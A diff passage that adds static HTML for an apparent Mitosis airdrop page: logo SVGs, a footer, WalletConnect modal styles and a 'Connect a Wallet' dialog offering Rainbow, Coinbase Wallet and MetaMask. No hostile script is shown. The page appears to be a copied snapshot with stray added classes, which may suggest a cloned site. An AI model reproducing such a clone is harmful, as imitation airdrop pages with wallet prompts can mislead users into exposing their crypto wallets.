17.8457 55.6196 17.8502C55.7225 17.9188 55.8274 17.9839 55.9343 18.0464C55.9464 18.058 55.9605 18.0656 55.9762 18.0706C56.7913 18.5347 57.725 18.8137 58.7203 18.8515C58.7475 18.8575 58.7753 18.8565 58.8035 18.8545C58.8529 18.8555 58.9024 18.8565 58.9518 18.8565H59.9955C60.0504 18.8565 60.1059 18.8555 60.1604 18.854C60.1917 18.8565 60.223 18.858 60.2537 18.8505C61.3186 18.8056 62.3118 18.4843 63.1638 17.9561C63.1839 17.9531 63.2006 17.944 63.2117 17.9264C63.2642 17.8931 63.3156 17.8598 63.3671 17.825C63.3817 17.823 63.3938 17.8164 63.4009 17.8018C63.4276 17.7831 63.4548 17.7649 63.4811 17.7463C63.5033 17.7422 63.5209 17.7317 63.5315 17.7095C63.6011 17.659 63.6697 17.6071 63.7373 17.5536C63.7721 17.542 63.8009 17.5213 63.8195 17.4875C63.8422 17.4689 63.8644 17.4497 63.8871 17.4305C63.929 17.43 63.9532 17.4098 63.9587 17.369C63.9749 17.3549 63.9915 17.3402 64.0077 17.3256C64.0369 17.3205 64.0561 17.3044 64.0642 17.2746C64.0828 17.2575 64.101 17.2403 64.1192 17.2232C64.1641 17.2207 64.1943 17.202 64.1953 17.1501C64.1989 17.1465 64.2024 17.143 64.2059 17.14C64.2634 17.1344 64.2947 17.1031 64.2997 17.0461C64.3033 17.0426 64.3073 17.0386 64.3108 17.035C64.3709 17.0295 64.4021 16.9952 64.4062 16.9352C64.4153 16.9251 64.4248 16.9155 64.4339 16.9054C64.4647 16.8973 64.4813 16.8777 64.4859 16.8484C64.5 16.8328 64.5141 16.8166 64.5282 16.8005C64.5701 16.7949 64.5903 16.7697 64.5908 16.7278C64.6014 16.7152 64.612 16.7031 64.6226 16.6905C64.666 16.6764 64.6932 16.6487 64.6952 16.6012C64.7053 16.5886 64.7154 16.576 64.7255 16.5634C64.8122 16.4898 64.8859 16.406 64.9237 16.2971C64.9353 16.2809 64.9464 16.2643 64.9575 16.2481C65.0009 16.237 65.015 16.2058 65.014 16.1649C65.0221 16.1533 65.0296 16.1412 65.0372 16.1296C65.0831 16.1003 65.1068 16.058 65.1154 16.0065C65.1356 15.9742 65.1552 15.9419 65.1744 15.9097C65.2087 15.8834 65.2254 15.8461 65.2355 15.8047C65.2592 15.7629 65.2829 15.7205 65.3056 15.6776C65.3147 15.6645 65.3217 15.6509 65.3273 15.6363C65.7681 14.7989 66.0178 13.8456 66.0178 12.8342V11.5211C66.0178 11.502 66.0163 11.4833 66.0143 11.4652C66.0143 10.8528 66.0143 10.2409 66.0143 9.62854H66.0193V9.62753Z" fill="currentColor"></path><path d="M32.8291 18.6153H29.8979C29.5725 18.6153 29.3087 18.3515 29.3087 18.0261V4.29816C29.3087 3.9728 29.5725 3.70898 29.8979 3.70898H32.8291C33.1545 3.70898 33.4183 3.9728 33.4183 4.29816V18.0261C33.4178 18.3515 33.1545 18.6153 32.8291 18.6153Z" fill="currentColor"></path><path d="M27.3232 14.8331H20.6976V4.17054C20.6976 3.9158 20.4908 3.70898 20.236 3.70898H17.0496C16.7948 3.70898 16.588 3.9158 16.588 4.17054V18.1538C16.588 18.4085 16.7948 18.6153 17.0496 18.6153H18.292H20.236H27.3232C27.578 18.6153 27.7848 18.4085 27.7848 18.1538V15.2942C27.7848 15.0399 27.578 14.8331 27.3232 14.8331Z" fill="currentColor"></path><path d="M49.0787 15.6358C49.0756 15.6212 49.0726 15.6071 49.0701 15.5934C49.0287 15.3609 49.0913 15.1208 49.232 14.9306C50.1339 13.7094 50.4527 12.6375 50.5637 12.0892C50.6121 11.7431 50.6373 11.39 50.6373 11.0309C50.6373 6.84162 47.241 3.44531 43.0518 3.44531C38.8625 3.44531 35.4662 6.84162 35.4662 11.0309C35.4662 15.2202 38.8625 18.6165 43.0518 18.6165C43.7267 18.6165 44.3804 18.5277 45.0034 18.3627C45.0049 18.3683 45.0059 18.3723 45.0059 18.3723C45.0059 18.3723 49.6199 19.7701 50.2863 18.3723C50.2863 18.3723 50.368 18.2033 50.1687 17.9375C49.9791 17.6843 49.2537 16.683 49.0787 15.6358ZM43.0563 14.5735C41.0996 14.5735 39.5132 12.9871 39.5132 11.0304C39.5132 9.07371 41.0996 7.48729 43.0563 7.48729C45.013 7.48729 46.5994 9.07371 46.5994 11.0304C46.5994 12.9871 45.0135 14.5735 43.0563 14.5735Z" fill="currentColor"></path><path d="M14.7212 13.9154L11.9882 12.8768C11.73 12.7784 11.4359 12.8803 11.2997 13.1209C10.6384 14.2881 9.39294 15.0751 7.96491 15.0751C5.8448 15.0751 4.12622 13.3413 4.12622 11.2026C4.12622 9.06379 5.8448 7.33007 7.96491 7.33007C9.39899 7.33007 10.6495 8.12354 11.3083 9.29936C11.447 9.54703 11.7506 9.64993 12.0129 9.54199L14.753 8.4161C15.0587 8.2905 15.1903 7.93085 15.0405 7.63576C14.5512 6.67129 13.8667 5.82082 13.0379 5.13379C12.9809 5.07579 10.5234 2.61115 5.44882 2.02451C5.44882 2.02451 0.430277 1.75615 0.807084 2.99553C1.14404 4.10476 1.84671 4.85333 0.792456 7.72958C0.705694 7.90613 0.625995 8.08621 0.552853 8.26932C0.486268 8.43578 0.294081 9.02596 0.267851 9.12331C0.0933189 9.76999 0 10.45 0 11.1511C0 15.4862 3.5547 19 7.94019 19C11.0323 19 13.7113 17.2522 15.0224 14.7018C15.1767 14.4026 15.0365 14.0354 14.7212 13.9154Z" fill="currentColor"></path></g><defs><clippath id="clip0_6597_8507"><rect width="80" height="22" fill="white"></rect></clippath></defs></svg></a>
+				<div class="h-[1px] w-full bg-border sm:hidden"></div>
+				<div class="flex flex-col justify-between gap-y-3 text-sm text-[#697586] sm:flex-row">
+					<p class="order-2 sm:order-1">© 2025 Mitosis. All rights reserved.</p>
+					<div class="order-1 flex flex-wrap gap-x-6 gap-y-3 sm:order-2"><a target="_blank" href="https://airdrop.mitosis.org/airdrop-tos">Airdrop Terms of Service</a></div>
+				</div>
+			</footer>
+		</main>
+	</div>
+	<wcm-modal>
+		<template shadowrootmode="open">
+			<style>
+			*,
+			::after,
+			::before {
+				margin: 0px;
+				padding: 0px;
+				box-sizing: border-box;
+				font-style: normal;
+				text-rendering: optimizespeed;
+				-webkit-font-smoothing: antialiased;
+				-webkit-tap-highlight-color: transparent;
+				backface-visibility: hidden
+			}
+			
+			button {
+				cursor: pointer;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				position: relative;
+				border: none;
+				background-color: transparent;
+				transition: 0.2s
+			}
+			
+			@media (hover:hover) and (pointer:fine) {
+				button:active {
+					transition: 0.1s;
+					transform: scale(0.93)
+				}
+			}
+			
+			button::after {
+				content: "";
+				position: absolute;
+				inset: 0px;
+				transition: background-color, 0.2s
+			}
+			
+			button:disabled {
+				cursor: not-allowed
+			}
+			
+			button svg,
+			button wcm-text {
+				position: relative;
+				z-index: 1
+			}
+			
+			input {
+				border: none;
+				outline: 0px;
+				appearance: none
+			}
+			
+			img {
+				display: block
+			}
+			
+			::selection {
+				color: var(--wcm-accent-fill-color);
+				background: var(--wcm-accent-color)
+			}
+			</style>
+			<style>
+			:host {
+				all: initial
+			}
+			
+			.wcm-overlay {
+				inset: 0px;
+				position: fixed;
+				z-index: var(--wcm-z-index);
+				overflow: hidden;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				opacity: 0;
+				pointer-events: none;
+				background-color: var(--wcm-overlay-background-color);
+				backdrop-filter: var(--wcm-overlay-backdrop-filter)
+			}
+			
+			@media (max-height:720px) and (orientation:landscape) {
+				.wcm-overlay {
+					overflow: scroll;
+					align-items: flex-start;
+					padding: 20px 0px
+				}
+			}
+			
+			.wcm-active {
+				pointer-events: auto
+			}
+			
+			.wcm-container {
+				position: relative;
+				max-width: 360px;
+				width: 100%;
+				outline: 0px;
+				border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius);
+				border: 1px solid var(--wcm-color-overlay);
+				overflow: hidden
+			}
+			
+			.wcm-card {
+				width: 100%;
+				position: relative;
+				border-radius: var(--wcm-container-border-radius);
+				overflow: hidden;
+				box-shadow: 0 6px 14px -6px rgba(10, 16, 31, .12), 0 10px 32px -4px rgba(10, 16, 31, .1), 0 0 0 1px var(--wcm-color-overlay);
+				background-color: var(--wcm-color-bg-1);
+				color: var(--wcm-color-fg-1)
+			}
+			
+			@media (max-width:600px) {
+				.wcm-container {
+					max-width: 440px;
+					border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius)0 0
+				}
+				.wcm-card {
+					border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius)0 0
+				}
+				.wcm-overlay {
+					align-items: flex-end
+				}
+			}
+			
+			@media (max-width:440px) {
+				.wcm-container {
+					border: 0px
+				}
+			}
+			</style>
+			<wcm-explorer-context>
+				<template shadowrootmode="open"></template>
+			</wcm-explorer-context>
+			<wcm-theme-context>
+				<template shadowrootmode="open"></template>
+			</wcm-theme-context>
+			<div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay ">
+				<div class="wcm-container" tabindex="0">
+					<!--?lit$5362499617$-->
+				</div>
+			</div>
+		</template>
+	</wcm-modal>
+	<div>
+		<div class="iekbcc0" data-rk>
+			<div style="display:none;" class=" bilal iekbcc0 ju367v4 ju367v8q _9pm4ki3 ju367v9h ju367vb3 ju367va ju367v2q ju367v8q" data-rk aria-labelledby="rk_connect_title" aria-modal="true" role="dialog">
+				<div tabindex="0"></div>
+				<div tabindex="-1" class="_9pm4ki5 ju367va ju367v15 ju367v8r" role="document" style="outline:none">
+					<div class="iekbcc0">
+						<div class="iekbcc0 _1ckjpok4 _1ckjpok1 ju367vb6 ju367vdr ju367vp ju367vt ju367vv ju367vel ju367va ju367v15 ju367v6c ju367v8r  ">
+							<div class="iekbcc0 ju367v84 ju367v6d ju367v6y ju367v7j">
+								<div class="iekbcc0 ju367va ju367v14" style="max-height:468px">
+									<div class="iekbcc0 ju367va ju367v15 ju367v4y _1vwt0cg4">
+										<div class="iekbcc0 ju367va ju367v2r">
+											<div class="iekbcc0 ju367v3s ju367v94"></div>
+											<div class="iekbcc0 ju367v7a ju367v7v ju367v3h ju367v6k ju367v86">
+												<h1 class="iekbcc0 ju367vgu ju367v16 ju367v1b ju367v1i ju367v2v" id="rk_connect_title" data-testid="rk-connect-header-label">Connect a Wallet</h1></div>
+											<div class="iekbcc0 ju367v4d">
+												<button class="iekbcc0 iekbcc9 ju367v4 ju367va0 ju367vc6 ju367vs ju367vt ju367vv ju367vff ju367va ju367v2b ju367v2q ju367v8u ju367v94 _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" aria-label="Close" type="button" style="will-change:transform">
+													<svg aria-hidden="true" fill="none" height="10" viewBox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg">
+														<title>Close</title>
+														<path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path>
+													</svg>
+												</button>
+											</div>
+										</div>
+										<div class="iekbcc0 ju367v6p _1vwt0cg2 ju367v7a ju367v7v">
+											<div class="iekbcc0 ju367v3n ju367v48 ju367v33 ju367v4y">
+												<div class="iekbcc0 ju367vh0 ju367v16 ju367v19 ju367v1h ju367v2v">Popular</div>
+											</div>
+											<div class="iekbcc0 ju367va ju367v15 open-modal-btn ju367v1n">
+												<div class="iekbcc0 ju367va ju367v15">
+													<button class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8u ju367v9f ju367vb1 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-rainbow" style="will-change:transform">
+														<div class="iekbcc0 ju367vgu ju367v16 ju367v1a ju367v1h ju367v8u">
+															<div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+																<div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v94" role="img" style="background:rgb(12,47,120)"><img class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true" src="data:image/svg+xml,<svg width=&quot;120&quot; height=&quot;120&quot; viewBox=&quot;0 0 120 120&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;120&quot; height=&quot;120&quot; fill=&quot;url(%23paint0_linear_62_329)&quot;/>%0A<path d=&quot;M20 38H26C56.9279 38 82 63.0721 82 94V100H94C97.3137 100 100 97.3137 100 94C100 53.1309 66.8691 20 26 20C22.6863 20 20 22.6863 20 26V38Z&quot; fill=&quot;url(%23paint1_radial_62_329)&quot;/>%0A<path d=&quot;M84 94H100C100 97.3137 97.3137 100 94 100H84V94Z&quot; fill=&quot;url(%23paint2_linear_62_329)&quot;/>%0A<path d=&quot;M26 20L26 36H20L20 26C20 22.6863 22.6863 20 26 20Z&quot; fill=&quot;url(%23paint3_linear_62_329)&quot;/>%0A<path d=&quot;M20 36H26C58.0325 36 84 61.9675 84 94V100H66V94C66 71.9086 48.0914 54 26 54H20V36Z&quot; fill=&quot;url(%23paint4_radial_62_329)&quot;/>%0A<path d=&quot;M68 94H84V100H68V94Z&quot; fill=&quot;url(%23paint5_linear_62_329)&quot;/>%0A<path d=&quot;M20 52L20 36L26 36L26 52H20Z&quot; fill=&quot;url(%23paint6_linear_62_329)&quot;/>%0A<path d=&quot;M20 62C20 65.3137 22.6863 68 26 68C40.3594 68 52 79.6406 52 94C52 97.3137 54.6863 100 58 100H68V94C68 70.804 49.196 52 26 52H20V62Z&quot; fill=&quot;url(%23paint7_radial_62_329)&quot;/>%0A<path d=&quot;M52 94H68V100H58C54.6863 100 52 97.3137 52 94Z&quot; fill=&quot;url(%23paint8_radial_62_329)&quot;/>%0A<path d=&quot;M26 68C22.6863 68 20 65.3137 20 62L20 52L26 52L26 68Z&quot; fill=&quot;url(%23paint9_radial_62_329)&quot;/>%0A<defs>%0A<linearGradient id=&quot;paint0_linear_62_329&quot; x1=&quot;60&quot; y1=&quot;0&quot; x2=&quot;60&quot; y2=&quot;120&quot; gradientUnits=&quot;userSpaceOnUse&quot;>%0A<stop stop-color=&quot;%23174299&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%23001E59&quot;/>%0A</linearGradient>%0A<radialGradient id=&quot;paint1_radial_62_329&quot; cx=&quot;0&quot; cy=&quot;0&quot; r=&quot;1&quot; gradientUnits=&quot;userSpaceOnUse&quot; gradientTransform=&quot;translate(26 94) rotate(-90) scale(74)&quot;>%0A<stop offset=&quot;0.770277&quot; stop-color=&quot;%23FF4000&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%238754C9&quot;/>%0A</radialGradient>%0A<linearGradient id=&quot;paint2_linear_62_329&quot; x1=&quot;83&quot; y1=&quot;97&quot; x2=&quot;100&quot; y2=&quot;97&quot; gradientUnits=&quot;userSpaceOnUse&quot;>%0A<stop stop-color=&quot;%23FF4000&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%238754C9&quot;/>%0A</linearGradient>%0A<linearGradient id=&quot;paint3_linear_62_329&quot; x1=&quot;23&quot; y1=&quot;20&quot; x2=&quot;23&quot; y2=&quot;37&quot; gradientUnits=&quot;userSpaceOnUse&quot;>%0A<stop stop-color=&quot;%238754C9&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%23FF4000&quot;/>%0A</linearGradient>%0A<radialGradient id=&quot;paint4_radial_62_329&quot; cx=&quot;0&quot; cy=&quot;0&quot; r=&quot;1&quot; gradientUnits=&quot;userSpaceOnUse&quot; gradientTransform=&quot;translate(26 94) rotate(-90) scale(58)&quot;>%0A<stop offset=&quot;0.723929&quot; stop-color=&quot;%23FFF700&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%23FF9901&quot;/>%0A</radialGradient>%0A<linearGradient id=&quot;paint5_linear_62_329&quot; x1=&quot;68&quot; y1=&quot;97&quot; x2=&quot;84&quot; y2=&quot;97&quot; gradientUnits=&quot;userSpaceOnUse&quot;>%0A<stop stop-color=&quot;%23FFF700&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%23FF9901&quot;/>%0A</linearGradient>%0A<linearGradient id=&quot;paint6_linear_62_329&quot; x1=&quot;23&quot; y1=&quot;52&quot; x2=&quot;23&quot; y2=&quot;36&quot; gradientUnits=&quot;userSpaceOnUse&quot;>%0A<stop stop-color=&quot;%23FFF700&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%23FF9901&quot;/>%0A</linearGradient>%0A<radialGradient id=&quot;paint7_radial_62_329&quot; cx=&quot;0&quot; cy=&quot;0&quot; r=&quot;1&quot; gradientUnits=&quot;userSpaceOnUse&quot; gradientTransform=&quot;translate(26 94) rotate(-90) scale(42)&quot;>%0A<stop offset=&quot;0.59513&quot; stop-color=&quot;%2300AAFF&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%2301DA40&quot;/>%0A</radialGradient>%0A<radialGradient id=&quot;paint8_radial_62_329&quot; cx=&quot;0&quot; cy=&quot;0&quot; r=&quot;1&quot; gradientUnits=&quot;userSpaceOnUse&quot; gradientTransform=&quot;translate(51 97) scale(17 45.3333)&quot;>%0A<stop stop-color=&quot;%2300AAFF&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%2301DA40&quot;/>%0A</radialGradient>%0A<radialGradient id=&quot;paint9_radial_62_329&quot; cx=&quot;0&quot; cy=&quot;0&quot; r=&quot;1&quot; gradientUnits=&quot;userSpaceOnUse&quot; gradientTransform=&quot;translate(23 69) rotate(-90) scale(17 322.37)&quot;>%0A<stop stop-color=&quot;%2300AAFF&quot;/>%0A<stop offset=&quot;1&quot; stop-color=&quot;%2301DA40&quot;/>%0A</radialGradient>%0A</defs>%0A</svg>%0A" style="transition:opacity 0.15s linear;user-select:none">
+																	<div class="iekbcc0 ju367vc6 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
+																</div>
+																<div class="iekbcc0">
+																	<div class="iekbcc0 ju367v5p">Rainbow</div>
+																</div>
+															</div>
+														</div>
+													</button>
+												</div>
+												<div class="iekbcc0 ju367va ju367v15">
+													<button class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8u ju367v9f ju367vb1 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-coinbase" style="will-change:transform">
+														<div class="iekbcc0 ju367vgu ju367v16 ju367v1a ju367v1h ju367v8u">
+															<div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+																<div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v94" role="img" style="background:rgb(44,95,246)"><img class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true" src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;%232C5FF6&quot;/>%0A<path fill-rule=&quot;evenodd&quot; clip-rule=&quot;evenodd&quot; d=&quot;M14 23.8C19.4124 23.8 23.8 19.4124 23.8 14C23.8 8.58761 19.4124 4.2 14 4.2C8.58761 4.2 4.2 8.58761 4.2 14C4.2 19.4124 8.58761 23.8 14 23.8ZM11.55 10.8C11.1358 10.8 10.8 11.1358 10.8 11.55V16.45C10.8 16.8642 11.1358 17.2 11.55 17.2H16.45C16.8642 17.2 17.2 16.8642 17.2 16.45V11.55C17.2 11.1358 16.8642 10.8 16.45 10.8H11.55Z&quot; fill=&quot;white&quot;/>%0A</svg>%0A" style="transition:opacity 0.15s linear;user-select:none">
+																	<div class="iekbcc0 ju367vc6 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
+																</div>
+																<div class="iekbcc0">
+																	<div class="iekbcc0 ju367v5p">Coinbase Wallet</div>
+																</div>
+															</div>
+														</div>
+													</button>
+												</div>
+												<div class="iekbcc0 ju367va ju367v15">
+													<button class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8u ju367v9f ju367vb1 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-metaMask" style="will-change:transform">
+														<div class="iekbcc0 ju367vgu ju367v16 ju367v1a ju367v1h ju367v8u">
+															<div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+																<div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v94" role="img" style="background:rgb(255,255,255)"><img class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true" src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;white&quot;/>%0A<path d=&quot;M24.0891 3.1199L15.3446 9.61456L16.9617 5.7828L24.0891 3.1199Z&quot; fill=&quot;%23E2761B&quot; stroke=&quot;%23E2761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M3.90207 3.1199L12.5763 9.67608L11.0383 5.7828L3.90207 3.1199Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.9429 18.1745L18.6139 21.7426L23.597 23.1136L25.0295 18.2536L20.9429 18.1745Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.97929 18.2536L4.40301 23.1136L9.38607 21.7426L7.05713 18.1745L2.97929 18.2536Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10483 12.1456L7.71626 14.2461L12.6642 14.4658L12.4884 9.14877L9.10483 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.8864 12.1456L15.4589 9.08725L15.3446 14.4658L20.2837 14.2461L18.8864 12.1456Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.3566 20.2925L9.79033 18.2888L9.38606 21.7426Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L18.6139 21.7426L18.2009 18.2888L15.6347 20.2925Z&quot; fill=&quot;%23E4761B&quot; stroke=&quot;%23E4761B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.6139 21.7426L15.6347 20.2925L15.8719 22.2348L15.8456 23.0521L18.6139 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L12.1544 23.0521L12.1368 22.2348L12.3566 20.2925L9.38606 21.7426Z&quot; fill=&quot;%23D7C1B3&quot; stroke=&quot;%23D7C1B3&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.1984 17.0056L9.72002 16.2762L11.4689 15.4765L12.1984 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.7928 17.0056L16.5223 15.4765L18.28 16.2762L15.7928 17.0056Z&quot; fill=&quot;%23233447&quot; stroke=&quot;%23233447&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.38606 21.7426L9.80791 18.1745L7.05712 18.2536L9.38606 21.7426Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.1921 18.1745L18.6139 21.7426L20.9429 18.2536L18.1921 18.1745Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M20.2837 14.2461L15.3446 14.4658L15.8016 17.0057L16.5311 15.4765L18.2888 16.2762L20.2837 14.2461Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L11.4777 15.4765L12.1984 17.0057L12.6642 14.4658L7.71626 14.2461L9.72002 16.2762Z&quot; fill=&quot;%23CD6116&quot; stroke=&quot;%23CD6116&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M7.71626 14.2461L9.79033 18.2888L9.72002 16.2762L7.71626 14.2461Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M18.2888 16.2762L18.2009 18.2888L20.2837 14.2461L18.2888 16.2762Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M12.6642 14.4658L12.1984 17.0057L12.7784 20.0025L12.9102 16.0565L12.6642 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.1073 16.0477L15.2128 20.0025L15.8016 17.0057L15.3446 14.4658Z&quot; fill=&quot;%23E4751F&quot; stroke=&quot;%23E4751F&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8016 17.0056L15.2128 20.0025L15.6347 20.2925L18.2009 18.2888L18.2888 16.2762L15.8016 17.0056Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.72002 16.2762L9.79033 18.2888L12.3566 20.2925L12.7784 20.0025L12.1984 17.0056L9.72002 16.2762Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.8456 23.0521L15.8719 22.2348L15.6522 22.0414H12.339L12.1368 22.2348L12.1544 23.0521L9.38606 21.7426L10.3528 22.5336L12.3126 23.8958H15.6786L17.6472 22.5336L18.6139 21.7426L15.8456 23.0521Z&quot; fill=&quot;%23C0AD9E&quot; stroke=&quot;%23C0AD9E&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.6347 20.2925L15.2128 20.0025H12.7784L12.3566 20.2925L12.1368 22.2348L12.339 22.0414H15.6522L15.8719 22.2348L15.6347 20.2925Z&quot; fill=&quot;%23161616&quot; stroke=&quot;%23161616&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M24.4583 10.0364L25.2053 6.45072L24.0891 3.1199L15.6347 9.39485L18.8864 12.1456L23.4827 13.4903L24.5022 12.3038L24.0628 11.9874L24.7658 11.3459L24.221 10.924L24.924 10.3879L24.4583 10.0364Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M2.79472 6.45072L3.54174 10.0364L3.06717 10.3879L3.77024 10.924L3.23415 